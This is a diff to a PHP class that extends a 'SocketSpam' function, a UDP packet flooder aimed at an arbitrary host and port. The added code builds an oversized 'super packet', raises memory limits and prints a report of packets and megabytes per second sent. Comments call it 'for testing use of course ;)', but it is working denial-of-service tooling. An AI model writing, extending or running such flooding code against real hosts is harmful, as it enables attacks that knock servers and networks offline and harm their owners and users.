@@ -65,10 +65,10 @@
         /* Packet spam. - For testing use of course. ;) ...
           NOTE: This function is currently super under optimized and was just made
           for some testing. :))) */
-          public function SocketSpam($type = 'TCP', $host, $port = false, $length = 5) {
+          public function SocketSpam($type = 'TCP', $host, $port = false, $length = 5, $super_packet = false) {
             # Spam needs.
               ignore_user_abort(true);
-              set_time_limit(0);
+              set_time_limit($length + 60);
 
             if ($type == 'UDP') {
               $max_time = time() + (string) $length;
@@ -76,6 +76,17 @@
               $packets = 0; # Keeping count of the amount of packets we've sent.
               # Making large packet.
               while (strlen($packet) < 65000) $packet .= Chr(255);
+              if ($super_packet) {
+                # MAKING THE SUPER PACKET!
+                ini_set('memory_limit', 1231251212);
+                $packet = $packet . $packet . $packet . $packet . $packet . $packet;
+                $packet = $packet . $packet . $packet . $packet . $packet . $packet;
+                $packet = $packet . $packet . $packet . $packet . $packet . $packet;
+                $packet = $packet . $packet . $packet . $packet . $packet . $packet . $packet . $packet;
+                # SUPER PACKET MADEEEEEEE!!!!!!!!!!!!
+                  # i has 2 much fun wit dis.
+              }
+
 
               $bytes = strlen($packet);
               $kb = $bytes / 1000 * 2;
@@ -89,7 +100,10 @@
 
               if ($packets) {
                 # We did it! We spammed the server for TESTING of course for you!
-
+                echo "we spammed <b>$host</b> for <b>$length</b> seconds successfully and sent a load of <b>{$mb}MB</b> / <b>{$kb}KB</b> <br/>
+                we sent <b>$packets</b> packets,
+                <b>".round($packets / $length)."</b> packets/s, and <b>".($mb / $length)."MB/s</b>, or <b>".($kb / $length)."KB/s</b>
+                ";
               }
 
 
@@ -98,7 +112,7 @@
 
             } else echo 'PSM Packet Spam Error: unknown type <b>'.$type.'</b>';
           }
-
+        /* Socket Spam Socket Open - Management for the Socket Spam function. */ 
           public function SocketSpamSO($type, $host, $packets, $packet) {
             if ($type == 'UDP') {
               # UDP SPAM SOCKET OPENING.
